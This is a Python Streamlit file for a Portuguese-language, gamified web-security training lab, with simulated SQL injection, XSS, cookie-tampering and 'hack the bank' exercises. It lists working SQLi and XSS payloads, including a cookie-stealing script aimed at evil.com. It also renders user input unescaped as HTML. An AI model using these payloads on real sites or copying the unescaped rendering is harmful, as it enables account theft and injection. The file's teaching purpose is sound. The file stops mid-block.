"""
CyberMentor AI - Módulo de Segurança Web
Laboratório interativo e gamificado para aprendizado de segurança web
"""

import streamlit as st
import requests
import base64
import urllib.parse
import re
import time
import random
import sys
import os
from pathlib import Path

# Adicionar diretório raiz para importações
root_dir = Path(__file__).parent.parent.parent
sys.path.append(str(root_dir))

from web_app.utils.helpers import setup_page_config, load_custom_css, display_status_alert

# Configuração da página
setup_page_config()
load_custom_css()

# CSS GLOBAL - SOLUÇÃO DEFINITIVA PARA LEGIBILIDADE
st.markdown("""
<style>
/* FORÇAR TEXTO BRANCO EM TODOS OS ELEMENTOS DO STREAMLIT */
/* Solução universal para problemas de contraste */

/* Expandir elementos - força texto branco */
.streamlit-expanderHeader, [data-testid="stExpander"] .streamlit-expanderHeader,
[data-testid="stExpander"] > div > div > div[role="button"],
[data-testid="stExpander"] > div[role="button"],
.streamlit-expander .streamlit-expanderHeader,
div[data-testid="stExpander"] div[role="button"] {
    background: #000000 !important;
    color: #ffffff !important;
    border: 2px solid #00ff41 !important;
    border-radius: 10px !important;
    font-weight: bold !important;
    font-size: 1.1em !important;
}

/* Conteúdo dos expanders */
[data-testid="stExpander"] > div > div > div > div,
[data-testid="stExpander"] .streamlit-expanderContent,
.streamlit-expander .streamlit-expanderContent {
    background: #000000 !important;
    color: #ffffff !important;
    border: 1px solid #00ff41 !important;
    border-radius: 0 0 10px 10px !important;
    border-top: none !important;
}

/* Todo texto dentro de expanders */
[data-testid="stExpander"] * {
    color: #ffffff !important;
}

/* Títulos e headers de expanders */
[data-testid="stExpander"] h1, [data-testid="stExpander"] h2, 
[data-testid="stExpander"] h3, [data-testid="stExpander"] h4,
[data-testid="stExpander"] h5, [data-testid="stExpander"] h6 {
    color: #00ff41 !important;
}

/* Força todos os elementos com background azul a ter texto branco */
[style*="background: linear-gradient(45deg, #667eea"] *,
[style*="background: linear-gradient(135deg, #667eea"] *,
[style*="background-color: #667eea"] *,
[style*="background: #667eea"] *,
[style*="background: linear-gradient(45deg, #0066ff"] *,
[style*="background: linear-gradient(135deg, #0066ff"] * {
    color: #ffffff !important;
}

/* Garantir que elementos com fundo gradient tenham texto branco */
div[style*="linear-gradient"] {
    color: #ffffff !important;
}

div[style*="linear-gradient"] * {
    color: #ffffff !important;
}

/* Forçar contraste em todos os elementos de texto - EXCETO SIDEBAR */
.main p, .main span, .main div, .main h1, .main h2, .main h3, .main h4, .main h5, .main h6 {
    text-shadow: 1px 1px 2px rgba(0,0,0,0.8) !important;
}

/* Excluir sidebar das mudanças globais */
[data-testid="stSidebar"] {
    /* Manter estilo original da sidebar */
}

[data-testid="stSidebar"] * {
    /* Não forçar cores na sidebar */
}
</style>
""", unsafe_allow_html=True)

# CSS personalizado para segurança web
st.markdown("""
<style>
/* Efeitos cyber específicos para web security */
.web-security-bg {
    background: linear-gradient(45deg, #0a0a0a, #1a1a1a, #0a0a0a);
    animation: webGlow 8s ease-in-out infinite;
}

@keyframes webGlow {
    0%, 100% { box-shadow: 0 0 20px #0066ff; }
    50% { box-shadow: 0 0 40px #0066ff, 0 0 60px #0066ff; }
}

.vulnerability-card {
    background: linear-gradient(135deg, #ff0000, #cc0000);
    color: white;
    padding: 20px;
    border-radius: 15px;
    margin: 10px 0;
    border: 2px solid #ff6b35;
    transition: all 0.3s ease;
    cursor: pointer;
}

.vulnerability-card:hover {
    transform: scale(1.05);
    box-shadow: 0 0 30px #ff0000;
}

.security-header {
    background: linear-gradient(45deg, #0066ff, #0044cc);
    color: white;
    padding: 25px;
    border-radius: 15px;
    text-align: center;
    border: 2px solid #00ff41;
    animation: securityPulse 3s infinite;
}

@keyframes securityPulse {
    0%, 100% { border-color: #00ff41; }
    50% { border-color: #ff6b35; }
}

.hacker-terminal {
    background: #000;
    color: #00ff41;
    padding: 20px;
    border-radius: 10px;
    font-family: 'Courier New', monospace;
    border: 2px solid #00ff41;
    margin: 20px 0;
}

.attack-simulator {
    background: rgba(255, 0, 0, 0.1);
    border: 2px solid #ff0000;
    border-radius: 10px;
    padding: 20px;
    margin: 20px 0;
}

.defense-zone {
    background: rgba(0, 255, 0, 0.1);
    border: 2px solid #00ff00;
    border-radius: 10px;
    padding: 20px;
    margin: 20px 0;
}

/* FORÇAR CONTRASTE EXPANDERES - SUPER AGRESSIVO */
div[data-testid="stExpander"] > div:first-child {
    background: rgba(0,0,0,0.95) !important;
    color: #ffffff !important;
    border: 2px solid #00ff41 !important;
    border-radius: 8px !important;
    padding: 15px !important;
}

div[data-testid="stExpander"] > div:first-child * {
    color: #ffffff !important;
    background: transparent !important;
}

div[data-testid="stExpander"] > div:last-child {
    background: rgba(0,0,0,0.9) !important;
    color: #ffffff !important;
    border: 2px solid #00ff41 !important;
    border-top: none !important;
    border-radius: 0 0 8px 8px !important;
    padding: 25px !important;
}

div[data-testid="stExpander"] > div:last-child * {
    color: #ffffff !important;
    background: transparent !important;
}

.streamlit-expanderHeader {
    background: rgba(0,0,0,0.95) !important;
    color: #ffffff !important;
    border: 2px solid #00ff41 !important;
    border-radius: 8px !important;
}

.streamlit-expanderHeader * {
    color: #ffffff !important;
}

.streamlit-expanderContent {
    background: rgba(0,0,0,0.9) !important;
    color: #ffffff !important;
    border: 2px solid #00ff41 !important;
    border-top: none !important;
    border-radius: 0 0 8px 8px !important;
    padding: 25px !important;
}

.streamlit-expanderContent * {
    color: #ffffff !important;
}
</style>
""", unsafe_allow_html=True)

# Header da página
st.markdown("""
<div class="security-header">
    <h1 class="main-title">🌐 Laboratório de Segurança Web</h1>
    <p class="main-subtitle">Hackear sites (eticamente) para aprender a protegê-los</p>
    <p style="color: #ff6b35; font-weight: bold;">⚡ Descubra as vulnerabilidades que hackers exploram TODOS os dias!</p>
</div>
""", unsafe_allow_html=True)

# Sidebar com navegação
st.sidebar.title("🎮 Menu de Ataques Web")
atividade_web = st.sidebar.selectbox(
    "Escolha sua arma digital:",
    [
        "🏠 Central de Comando",
        "🕵️ Scanner de Vulnerabilidades",
        "💉 SQL Injection Playground", 
        "🎭 XSS Attack Simulator",
        "🍪 Cookie Monster Lab",
        "🔓 Broken Authentication",
        "📡 CSRF Attack Workshop",
        "🚫 Security Headers Inspector",
        "🔍 OSINT Web Recon",
        "🛡️ WAF Bypass Techniques",
        "🎯 Bug Bounty Simulator",
        "🏆 Final Boss: Hack the Bank"
    ]
)

# Inicializar estados da sessão
if 'pontos_web' not in st.session_state:
    st.session_state.pontos_web = 0
if 'vulnerabilidades_encontradas' not in st.session_state:
    st.session_state.vulnerabilidades_encontradas = []
if 'nivel_hacker' not in st.session_state:
    st.session_state.nivel_hacker = "Script Kiddie"

# Sistema de pontuação e gamificação
def adicionar_pontos(pontos, descricao):
    st.session_state.pontos_web += pontos
    st.success(f"🏆 +{pontos} pontos! {descricao}")
    
    # Sistema de níveis
    if st.session_state.pontos_web >= 1000:
        st.session_state.nivel_hacker = "Elite Hacker"
    elif st.session_state.pontos_web >= 500:
        st.session_state.nivel_hacker = "Advanced Pentester"
    elif st.session_state.pontos_web >= 200:
        st.session_state.nivel_hacker = "Bug Hunter"
    elif st.session_state.pontos_web >= 50:
        st.session_state.nivel_hacker = "Script Kiddie"

# Status do usuário
st.sidebar.markdown("---")
st.sidebar.markdown("### 🏆 Seu Status")
st.sidebar.metric("Pontos", st.session_state.pontos_web)
st.sidebar.markdown(f"**Nível:** {st.session_state.nivel_hacker}")
st.sidebar.metric("Vulnerabilidades", len(st.session_state.vulnerabilidades_encontradas))

# ==============================================================================
# CENTRAL DE COMANDO
# ==============================================================================
if atividade_web == "🏠 Central de Comando":
    st.markdown("""
    <div class="hacker-terminal">
        <h2>🚨 [ACESSO AO DARK WEB GRANTED] 🚨</h2>
        <p>>>> Inicializando sistema de ataque web...</p>
        <p>>>> Carregando arsenal de exploits...</p>
        <p>>>> Target: www.vulnerable-site.com</p>
        <p>>>> Status: READY TO HACK</p>
    </div>
    """, unsafe_allow_html=True)
    
    st.subheader("🎯 Bem-vindo ao Dark Side da Web!")
    
    col1, col2, col3 = st.columns(3)
    
    with col1:
        st.markdown("""
        <div class="vulnerability-card">
            <h3>💉 SQL INJECTION</h3>
            <p><strong>Severidade:</strong> CRÍTICA 🔴</p>
            <p><strong>Impacto:</strong> Acesso total ao banco de dados</p>
            <p><strong>Frequência:</strong> 30% dos sites vulneráveis</p>
        </div>
        """, unsafe_allow_html=True)
    
    with col2:
        st.markdown("""
        <div class="vulnerability-card">
            <h3>🎭 XSS ATTACK</h3>
            <p><strong>Severidade:</strong> ALTA 🟠</p>
            <p><strong>Impacto:</strong> Roubo de cookies e sessões</p>
            <p><strong>Frequência:</strong> 40% dos sites vulneráveis</p>
        </div>
        """, unsafe_allow_html=True)
    
    with col3:
        st.markdown("""
        <div class="vulnerability-card">
            <h3>🍪 SESSION HIJACK</h3>
            <p><strong>Severidade:</strong> ALTA 🟠</p>
            <p><strong>Impacto:</strong> Sequestro de conta</p>
            <p><strong>Frequência:</strong> 20% dos sites vulneráveis</p>
        </div>
        """, unsafe_allow_html=True)
    
    # Top 10 OWASP interativo
    st.subheader("📊 OWASP Top 10 2024: Os Vilões da Web")
    
    owasp_top10 = [
        ("A01 - Broken Access Control", "Falhas no controle de acesso", "34% dos sites"),
        ("A02 - Cryptographic Failures", "Falhas criptográficas", "29% dos sites"),
        ("A03 - Injection", "Injeção de código", "25% dos sites"),
        ("A04 - Insecure Design", "Design inseguro", "22% dos sites"),
        ("A05 - Security Misconfiguration", "Configuração incorreta", "20% dos sites")
    ]
    
    for i, (vuln, desc, freq) in enumerate(owasp_top10):
        with st.expander(f"🎯 {vuln}"):
            st.markdown(f"""
            **Descrição:** {desc}
            
            **Frequência:** {freq}
            
            **Como explorar:** Use os simuladores do menu lateral!
            
            **Impacto real:** Pode resultar em vazamento de milhões de dados
            """)

# ==============================================================================
# SCANNER DE VULNERABILIDADES
# ==============================================================================
elif atividade_web == "🕵️ Scanner de Vulnerabilidades":
    st.markdown("""
    <div class="security-header">
        <h1>🕵️ Scanner de Vulnerabilidades Web</h1>
        <p>Faça uma varredura completa em qualquer site (só use em sites seus!)</p>
    </div>
    """, unsafe_allow_html=True)
    
    # Simulador de scanner
    target_url = st.text_input(
        "🎯 Digite a URL do site para escanear:",
        placeholder="https://example.com",
        help="⚠️ AVISO: Só escaneie sites que você possui ou tem autorização!"
    )
    
    scan_type = st.selectbox(
        "🔍 Tipo de scan:",
        ["Quick Scan (1 min)", "Deep Scan (5 min)", "Ninja Scan (Stealth)"]
    )
    
    if st.button("🚀 INICIAR SCAN"):
        if target_url:
            # Simulação de scanning
            st.markdown("""
            <div class="hacker-terminal">
                <h3>[SCANNING IN PROGRESS...]</h3>
                <p>>>> Checking HTTP headers...</p>
                <p>>>> Testing for SQL injection...</p>
                <p>>>> Analyzing cookies...</p>
                <p>>>> Scanning for XSS vulnerabilities...</p>
                <p>>>> Checking security headers...</p>
            </div>
            """, unsafe_allow_html=True)
            
            # Progress bar
            progress_bar = st.progress(0)
            for i in range(100):
                time.sleep(0.02)
                progress_bar.progress(i + 1)
            
            # Resultados simulados
            st.success("✅ Scan completo!")
            
            # Vulnerabilidades encontradas (simuladas)
            vulnerabilidades = [
                ("🔴 CRÍTICA", "SQL Injection detectada em login.php"),
                ("🟠 ALTA", "XSS refletido em search.php"),
                ("🟡 MÉDIA", "Headers de segurança ausentes"),
                ("🔵 BAIXA", "Versão do servidor exposta"),
                ("🟢 INFO", "Formulário sem proteção CSRF")
            ]
            
            st.subheader("🚨 Vulnerabilidades Encontradas:")
            
            for severidade, descricao in vulnerabilidades:
                if st.button(f"{severidade} {descricao}", key=f"vuln_{descricao}"):
                    st.info(f"💡 **Como explorar:** {descricao}")
                    adicionar_pontos(10, "Vulnerabilidade analisada!")
                    if descricao not in st.session_state.vulnerabilidades_encontradas:
                        st.session_state.vulnerabilidades_encontradas.append(descricao)
            
            # Relatório detalhado
            with st.expander("📋 Relatório Completo"):
                st.markdown("""
                ### 🔍 Análise Detalhada
                
                **Site analisado:** """ + target_url + """
                
                **Tempo de scan:** 2 minutos
                
                **Vulnerabilidades críticas:** 1
                **Vulnerabilidades altas:** 1
                **Vulnerabilidades médias:** 1
                
                ### 🛡️ Recomendações:
                1. Implementar validação de entrada
                2. Usar prepared statements
                3. Adicionar headers de segurança
                4. Implementar proteção CSRF
                """)

# ==============================================================================
# SQL INJECTION PLAYGROUND
# ==============================================================================
elif atividade_web == "💉 SQL Injection Playground":
    st.markdown("""
    <div class="security-header">
        <h1>💉 SQL Injection: A Arte de Quebrar Bancos de Dados</h1>
        <p>Aprenda o ataque que permite roubar TODOS os dados de um site</p>
    </div>
    """, unsafe_allow_html=True)
    
    # Simulador de login vulnerável
    st.subheader("🎮 Simulador: Hackeie Este Login!")
    
    st.markdown("""
    <div class="attack-simulator">
        <h3>🚨 SITE VULNERÁVEL SIMULADO</h3>
        <p>Tente fazer login sem conhecer a senha usando SQL Injection!</p>
    </div>
    """, unsafe_allow_html=True)
    
    col1, col2 = st.columns(2)
    
    with col1:
        st.markdown("### 🕷️ Portal de Login Vulnerável")
        username = st.text_input("👤 Usuário:", placeholder="admin")
        password = st.text_input("🔐 Senha:", type="password", placeholder="Tente: ' OR '1'='1")
        
        if st.button("🚀 Tentar Login"):
            # Simular SQL injection
            sql_query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
            
            st.code(f"Query SQL gerada:\n{sql_query}")
            
            # Verificar payloads comuns
            payloads_sucesso = [
                "' OR '1'='1",
                "' OR 1=1--",
                "admin'--",
                "' UNION SELECT * FROM users--"
            ]
            
            if any(payload in password for payload in payloads_sucesso) or any(payload in username for payload in payloads_sucesso):
                st.success("🚨 **HACK SUCESSFUL!** Login bypassed!")
                st.balloons()
                adicionar_pontos(50, "SQL Injection executada com sucesso!")
                
                # Mostrar dados "vazados"
                st.markdown("""
                <div class="hacker-terminal">
                    <h3>💀 DADOS VAZADOS:</h3>
                    <p>admin:$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi</p>
                    <p>john:password123</p>
                    <p>sarah:qwerty456</p>
                    <p>mike:letmein789</p>
                </div>
                """, unsafe_allow_html=True)
            else:
                st.error("❌ Login falhou. Tente usar SQL injection!")
    
    with col2:
        st.markdown("### 🎓 Dicas de SQL Injection")
        
        dica_selecionada = st.selectbox(
            "Escolha uma técnica:",
            [
                "Basic OR bypass",
                "Comment bypass", 
                "UNION attack",
                "Blind SQLi",
                "Time-based SQLi"
            ]
        )
        
        if dica_selecionada == "Basic OR bypass":
            st.code("""
# Payload mais comum:
' OR '1'='1

# Como funciona:
SELECT * FROM users 
WHERE username='admin' 
AND password='' OR '1'='1'

# Resultado: Sempre TRUE!
            """)
        elif dica_selecionada == "Comment bypass":
            st.code("""
# Payload com comentário:
admin'--

# Como funciona:
SELECT * FROM users 
WHERE username='admin'--' 
AND password='...'

# O -- comenta o resto!
            """)
        elif dica_selecionada == "UNION attack":
            st.code("""
# Payload UNION:
' UNION SELECT username,password FROM users--

# Extrai dados de outras tabelas
# Muito poderoso para exfiltração
            """)
    
    # Quiz sobre SQL Injection
    st.markdown("---")
    st.subheader("🧠 Quiz: Você é um SQL Injection Master?")
    
    quiz_sql = [
        {
            "pergunta": "💀 Qual é o payload básico para bypass de login?",
            "opcoes": ["A) DROP TABLE users", "B) ' OR '1'='1", "C) SELECT * FROM users", "D) UPDATE users SET"],
            "resposta": "B",
            "explicacao": "' OR '1'='1 sempre retorna TRUE, fazendo bypass da autenticação!"
        },
        {
            "pergunta": "🎯 O que faz o comentário -- em SQL?",
            "opcoes": ["A) Divide números", "B) Comenta o resto da linha", "C) Multiplica valores", "D) Deleta dados"],
            "resposta": "B", 
            "explicacao": "O -- comenta tudo após ele, permitindo ignorar partes da query!"
        }
    ]
    
    for i, q in enumerate(quiz_sql):
        st.markdown(f"**{q['pergunta']}**")
        resposta = st.radio("Escolha sua resposta:", q['opcoes'], key=f"sql_q_{i}")
        
        if st.button(f"Verificar resposta", key=f"sql_check_{i}"):
            if resposta.startswith(q['resposta']):
                st.success(f"✅ **CORRETO!** {q['explicacao']}")
                adicionar_pontos(25, "Questão de SQL respondida!")
            else:
                st.error(f"❌ **ERRADO!** {q['explicacao']}")

# ==============================================================================
# XSS ATTACK SIMULATOR
# ==============================================================================
elif atividade_web == "🎭 XSS Attack Simulator":
    st.markdown("""
    <div class="security-header">
        <h1>🎭 XSS: Cross-Site Scripting Attack Lab</h1>
        <p>Injete JavaScript malicioso e roube cookies como um verdadeiro hacker</p>
    </div>
    """, unsafe_allow_html=True)
    
    # Tipos de XSS
    xss_type = st.selectbox(
        "🎯 Escolha o tipo de XSS:",
        [
            "🔴 Reflected XSS (Mais comum)",
            "💀 Stored XSS (Mais perigoso)", 
            "🕷️ DOM-based XSS (Mais técnico)"
        ]
    )
    
    if "Reflected" in xss_type:
        st.subheader("🔴 Reflected XSS Simulator")
        
        st.markdown("""
        <div class="attack-simulator">
            <h3>🎯 SIMULADOR: Site de Busca Vulnerável</h3>
            <p>Este site não filtra o input do usuário. Injete JavaScript!</p>
        </div>
        """, unsafe_allow_html=True)
        
        search_query = st.text_input(
            "🔍 Digite sua busca:",
            placeholder="Tente: <script>alert('XSS!')</script>"
        )
        
        if st.button("🚀 Buscar"):
            # Simular XSS refletido
            if "<script>" in search_query.lower() or "javascript:" in search_query.lower():
                st.error("🚨 **XSS DETECTADO!** Payload executado com sucesso!")
                st.markdown(f"""
                <div class="hacker-terminal">
                    <h3>💀 PAYLOAD EXECUTADO:</h3>
                    <p>Input do usuário: {search_query}</p>
                    <p>HTML gerado: &lt;div&gt;Resultados para: {search_query}&lt;/div&gt;</p>
                    <p>🚨 JavaScript malicioso foi executado no navegador da vítima!</p>
                </div>
                """, unsafe_allow_html=True)
                adicionar_pontos(40, "XSS attack executado!")
                st.balloons()
            else:
                st.info(f"Resultados da busca para: '{search_query}' (nenhum resultado encontrado)")
        
        # Payloads comuns
        st.subheader("🕷️ Payloads XSS Populares")
        
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//"
        ]
        
        for payload in payloads:
            if st.button(f"📋 Copiar: {payload}", key=f"payload_{payload}"):
                st.code(payload)
                st.info("Payload copiado! Cole no campo de busca acima.")
    
    elif "Stored" in xss_type:
        st.subheader("💀 Stored XSS: O Mais Perigoso")
        
        st.markdown("""
        <div class="attack-simulator">
            <h3>💬 SIMULADOR: Comentários Vulneráveis</h3>
            <p>Deixe um comentário malicioso que será executado para TODOS os visitantes!</p>
        </div>
        """, unsafe_allow_html=True)
        
        nome = st.text_input("👤 Seu nome:", value="Anonymous")
        comentario = st.text_area(
            "💬 Comentário:",
            placeholder="Tente: <script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>"
        )
        
        if st.button("📝 Postar Comentário"):
            if "<script>" in comentario.lower():
                st.error("🚨 **STORED XSS!** Comentário malicioso salvo!")
                st.markdown(f"""
                <div class="hacker-terminal">
                    <h3>💀 ATAQUE PERSISTENTE CRIADO!</h3>
                    <p>Autor: {nome}</p>
                    <p>Payload: {comentario}</p>
                    <p>🚨 Este código será executado para TODOS os visitantes!</p>
                    <p>💀 Potencial para roubar cookies de milhares de usuários!</p>
                </div>
                """, unsafe_allow_html=True)
                adicionar_pontos(60, "Stored XSS - o mais perigoso!")
            else:
                st.success(f"✅ Comentário de {nome} postado com sucesso!")
                st.info(f"💬 {comentario}")
    
    # Jogo: XSS Defense
    st.markdown("---")
    st.subheader("🛡️ Jogo: XSS Defense Challenge")
    
    st.markdown("**Você é um desenvolvedor. Como proteger contra estes payloads?**")
    
    payload_challenge = st.selectbox(
        "🎯 Payload malicioso:",
        [
            "<script>alert('hack')</script>",
            "<img src=x onerror=alert('xss')>", 
            "javascript:alert('owned')"
        ]
    )
    
    defesa = st.radio(
        "🛡️ Qual a melhor defesa?",
        [
            "A) Validar apenas no frontend",
            "B) Escapar/sanitizar HTML no backend", 
            "C) Confiar no usuário",
            "D) Usar apenas HTTPS"
        ]
    )
    
    if st.button("🎯 Verificar Defesa"):
        if defesa.startswith("B"):
            st.success("✅ **CORRETO!** Sempre escape/sanitize no backend!")
            adicionar_pontos(30, "Defesa XSS correta!")
        else:
            st.error("❌ **ERRADO!** A sanitização no backend é essencial!")

# ==============================================================================
# COOKIE MONSTER LAB
# ==============================================================================
elif atividade_web == "🍪 Cookie Monster Lab":
    st.markdown("""
    <div class="security-header">
        <h1>🍪 Cookie Monster: Roubando Sessões Como um Profissional</h1>
        <p>Aprenda a roubar, modificar e sequestrar cookies para hackear contas</p>
    </div>
    """, unsafe_allow_html=True)
    
    # Simulador de cookie hijacking
    st.subheader("🎮 Simulador: Session Hijacking")
    
    # Mostrar cookies "capturados"
    cookies_simulados = {
        "sessionid": "abc123def456ghi789",
        "user": "admin",
        "role": "user",
        "cart": "item1,item2,item3",
        "preferences": "dark_mode=true"
    }
    
    st.markdown("### 🍪 Cookies Capturados da Vítima:")
    
    for nome, valor in cookies_simulados.items():
        col1, col2, col3 = st.columns([1, 2, 1])
        
        with col1:
            st.code(nome)
        with col2:
            st.code(valor)
        with col3:
            if st.button(f"📝 Editar", key=f"edit_{nome}"):
                novo_valor = st.text_input(f"Novo valor para {nome}:", value=valor, key=f"new_{nome}")
                if nome == "role" and novo_valor == "admin":
                    st.success("🚨 **PRIVILEGE ESCALATION!** Você agora é admin!")
                    adicionar_pontos(50, "Cookie modificado para admin!")
    
    # Jogo de cookie hijacking
    st.markdown("---")
    st.subheader("🎯 Desafio: Transforme-se em Admin")
    
    if st.button("🍪 Modificar Cookie 'role' para 'admin'"):
        st.success("🏆 **HACK SUCESSFUL!** Você escalou privilégios!")
        st.balloons()
        st.markdown("""
        <div class="hacker-terminal">
            <h3>💀 SESSÃO SEQUESTRADA!</h3>
            <p>Cookie original: role=user</p>
            <p>Cookie modificado: role=admin</p>
            <p>🚨 Agora você tem acesso administrativo total!</p>
        </div>
        """, unsafe_allow_html=True)
        adicionar_pontos(75, "Session hijacking bem-sucedido!")

# ==============================================================================
# SECURITY HEADERS INSPECTOR
# ==============================================================================
elif atividade_web == "🚫 Security Headers Inspector":
    st.markdown("""
    <div class="security-header">
        <h1>🚫 Security Headers: A Primeira Linha de Defesa</h1>
        <p>Analise headers de segurança que protegem (ou não) sites reais</p>
    </div>
    """, unsafe_allow_html=True)
    
    # Inspector de headers
    url_inspecionar = st.text_input(
        "🔍 URL para analisar headers:",
        placeholder="https://example.com"
    )
    
    if st.button("🚀 Analisar Headers") and url_inspecionar:
        try:
            # Simular análise de headers (em produção, usaria requests real)
            headers_simulados = {
                "X-Content-Type-Options": "nosniff",
                "X-Frame-Options": "MISSING ⚠️",
                "X-XSS-Protection": "1; mode=block", 
                "Strict-Transport-Security": "MISSING ⚠️",
                "Content-Security-Policy": "MISSING ⚠️",
                "Referrer-Policy": "strict-origin-when-cross-origin"
            }
            
            st.subheader("📊 Análise de Security Headers")
            
            score = 0
            max_score = len(headers_simulados)
            
            for header, value in headers_simulados.items():
                col1, col2, col3 = st.columns([2, 2, 1])
                
                with col1:
                    st.markdown(f"**{header}**")
                with col2:
                    if "MISSING" in value:
                        st.error(value)
                    else:
                        st.success(value)
                        score += 1
                with col3:
                    if st.button("ℹ️", key=f"info_{header}"):
                        if header == "X-Frame-Options":
                            st.info("Protege contra clickjacking attacks")
                        elif header == "Content-Security-Policy":
                            st.info("Previne ataques XSS e injection")
                        elif header == "Strict-Transport-Security":
                            st.info("Força conexões HTTPS")
            
            # Score de segurança
            percentage = (score / max_score) * 100
            st.metric("🏆 Score de Segurança", f"{percentage:.0f}%")
            
            if percentage >= 80:
                st.success("✅ Site bem protegido!")
            elif percentage >= 50:
                st.warning("⚠️ Proteção moderada")
            else:
                st.error("🚨 Site muito vulnerável!")
                
        except Exception as e:
            st.error("Erro na análise. Usando dados simulados para demonstração.")

# ==============================================================================
# BUG BOUNTY SIMULATOR
# ==============================================================================
elif atividade_web == "🎯 Bug Bounty Simulator":
    st.markdown("""
    <div class="security-header">
        <h1>🎯 Bug Bounty: Ganhe Dinheiro Hackeando</h1>
        <p>Simule uma caçada real de vulnerabilidades e calcule seus ganhos</p>
    </div>
    """, unsafe_allow_html=True)
    
    # Empresas fictícias com recompensas
    empresas_bounty = {
        "🍎 TechCorp": {"SQLi": "$5,000", "XSS": "$2,000", "RCE": "$25,000"},
        "🔍 SearchEngine": {"SQLi": "$3,000", "XSS": "$1,500", "RCE": "$20,000"},
        "📘 SocialNet": {"SQLi": "$4,000", "XSS": "$2,500", "RCE": "$30,000"},
        "🏪 EcommerceSite": {"SQLi": "$2,000", "XSS": "$1,000", "RCE": "$15,000"}
    }
    
    empresa_alvo = st.selectbox("🎯 Escolha sua empresa alvo:", list(empresas_bounty.keys()))
    
    st.subheader(f"💰 Tabela de Recompensas - {empresa_alvo}")
    
    recompensas = empresas_bounty[empresa_alvo]
    
    col1, col2, col3 = st.columns(3)
    
    with col1:
        if st.button(f"💉 Encontrar SQL Injection\n{recompensas['SQLi']}"):
            st.success(f"🏆 **VULNERABILITY FOUND!** Você ganhou {recompensas['SQLi']}!")
            adicionar_pontos(100, f"Bug bounty: {recompensas['SQLi']}")
            st.balloons()
    
    with col2:
        if st.button(f"🎭 Encontrar XSS\n{recompensas['XSS']}"):
            st.success(f"🏆 **VULNERABILITY FOUND!** Você ganhou {recompensas['XSS']}!")
            adicionar_pontos(75, f"Bug bounty: {recompensas['XSS']}")
    
    with col3:
        if st.button(f"💀 Encontrar RCE\n{recompensas['RCE']}"):
            st.success(f"🏆 **CRITICAL FIND!** Você ganhou {recompensas['RCE']}!")
            adicionar_pontos(250, f"Bug bounty: {recompensas['RCE']}")
            st.balloons()
    
    # Calculadora de ganhos
    st.markdown("---")
    st.subheader("💰 Calculadora de Ganhos Bug Bounty")
    
    vulnerabilidades_encontradas = st.number_input("Vulnerabilidades encontradas este mês:", min_value=0, value=5)
    payout_medio = st.slider("Payout médio por vulnerabilidade:", min_value=100, max_value=50000, value=2500)
    
    ganho_mensal = vulnerabilidades_encontradas * payout_medio
    ganho_anual = ganho_mensal * 12
    
    col1, col2 = st.columns(2)
    
    with col1:
        st.metric("💵 Ganho Mensal", f"${ganho_mensal:,}")
    with col2:
        st.metric("💰 Ganho Anual", f"${ganho_anual:,}")
    
    if ganho_anual >= 100000:
        st.success("🏆 **ELITE BUG HUNTER!** Você pode viver só de bug bounty!")
    elif ganho_anual >= 50000:
        st.warning("👍 **BOA RENDA!** Excelente renda extra!")
    else:
        st.info("📈 **CONTINUE PRATICANDO!** Melhore suas skills!")

# ==============================================================================
# FINAL BOSS: HACK THE BANK
# ==============================================================================
elif atividade_web == "🏆 Final Boss: Hack the Bank":
    st.markdown("""
    <div class="security-header">
        <h1>🏆 FINAL BOSS: Hack the Bank</h1>
        <p>O desafio supremo! Use tudo que aprendeu para hackear um banco (simulado)</p>
    </div>
    """, unsafe_allow_html=True)
    
    # Simulação de um banco super seguro
    st.markdown("""
    <div class="hacker-terminal">
        <h2>🏦 SECURE BANK ONLINE</h2>
        <p>🛡️ Sistema protegido por múltiplas camadas de segurança</p>
        <p>🚨 Tentativas de invasão são monitoradas e reportadas ao FBI</p>
        <p>⚡ WAF (Web Application Firewall) ATIVO</p>
    </div>
    """, unsafe_allow_html=True)
    
    st.subheader("🎯 Missão: Transferir $1,000,000 para sua conta")
    
    # Sistema de múltiplas etapas
    if 'stage_bank' not in st.session_state:
        st.session_state.stage_bank = 1
    
    if st.session_state.stage_bank == 1:
        st.markdown("### 🔐 Etapa 1: Bypass do Login")
        
        bank_user = st.text_input("👤 Usuário do banco:", placeholder="admin")
        bank_pass = st.text_input("🔐 Senha do banco:", type="password", placeholder="Tente SQL injection")
        
        if st.button("🚀 Tentar Login Bancário"):
            if "' OR '1'='1" in bank_pass or "admin'--" in bank_user:
                st.success("✅ **ETAPA 1 COMPLETA!** Login bypassed!")
                st.session_state.stage_bank = 2
                adicionar_pontos(100, "Banco hackeado - Etapa 1!")
                st.rerun()
            else:
                st.error("❌ **ACESSO NEGADO!** Tente SQL injection!")
    
    elif st.session_state.stage_bank == 2:
        st.markdown("### 💰 Etapa 2: Encontrar Conta com Dinheiro")
        
        if st.button("🔍 Executar: ' UNION SELECT account_number, balance FROM accounts WHERE balance > 1000000--"):
            st.success("✅ **ETAPA 2 COMPLETA!** Conta encontrada!")
            st.markdown("""
            <div class="hacker-terminal">
                <h3>💰 CONTA ENCONTRADA:</h3>
                <p>Account: 123456789</p>
                <p>Balance: $5,247,389.12</p>
                <p>Owner: John Millionaire</p>
            </div>
            """, unsafe_allow_html=True)
            st.session_state.stage_bank = 3
            adicionar_pontos(150, "Conta milionária encontrada!")
    
    elif st.session_state.stage_bank == 3:
        st.markdown("### 🎯 Etapa 3: Transferir o Dinheiro")
        
        valor_transferir = st.number_input("💵 Valor a transferir:", min_value=1, max_value=1000000, value=1000000)
        conta_destino = st.text_input("🏦 Sua conta:", placeholder="999888777")
        
        if st.button("💸 EXECUTAR TRANSFERÊNCIA"):
            if valor_transferir >= 1000000:
                st.success("🏆 **BANCO HACKEADO COM SUCESSO!**")
                st.balloons()
                
                st.markdown("""
                <div style="background: linear-gradient(45deg, #ff6b35, #f7931e); padding: 20px; border-radius: 10px; text-align: center;">
                    <h2 style="color: white;">🎉 PARABÉNS! VOCÊ É UM HACKER ELITE!</h2>
                    <p style="color: white; font-size: 1.2em;">Você transferiu $1,000,000 com sucesso!</p>
                    <p style="color: white;">🏆 TÍTULO DESBLOQUEADO: BANK HACKER MASTER 🏆</p>
                </div>
                """, unsafe_allow_html=True)
                
